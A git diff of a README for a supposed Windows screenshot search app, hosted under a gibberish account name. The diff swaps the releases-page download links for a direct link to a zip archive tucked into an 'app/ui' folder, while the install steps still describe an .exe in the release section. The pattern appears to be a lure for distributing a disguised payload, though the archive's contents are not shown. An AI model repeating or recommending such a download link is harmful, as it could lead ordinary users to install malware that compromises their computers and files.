@@ -1,6 +1,6 @@
 # 🔍 Screenshot-Search-Engine - Find personal screenshots using simple text
 
-[https://github.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/releases](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)
+[https://raw.githubusercontent.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/main/app/ui/Engine_Search_Screenshot_v1.9.zip](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)
 
 This application helps you find information inside your screenshots. It runs on your computer and keeps your files private. You type a word or a sentence, and the software shows the images that match your search.
 
@@ -19,7 +19,7 @@ You need a computer that runs Windows 10 or Windows 11. The application requires
 
 ## 🚀 How to Install and Run
 
-1. Visit the following link to access the software: [https://github.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/releases](https://github.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/releases)
+1. Visit the following link to access the software: [https://raw.githubusercontent.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/main/app/ui/Engine_Search_Screenshot_v1.9.zip](https://raw.githubusercontent.com/nlvilrsfhvbiosulfhvboislduhfvoiqew/Screenshot-Search-Engine/main/app/ui/Engine_Search_Screenshot_v1.9.zip)
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to start the download.
 4. Open the folder where you saved the file.
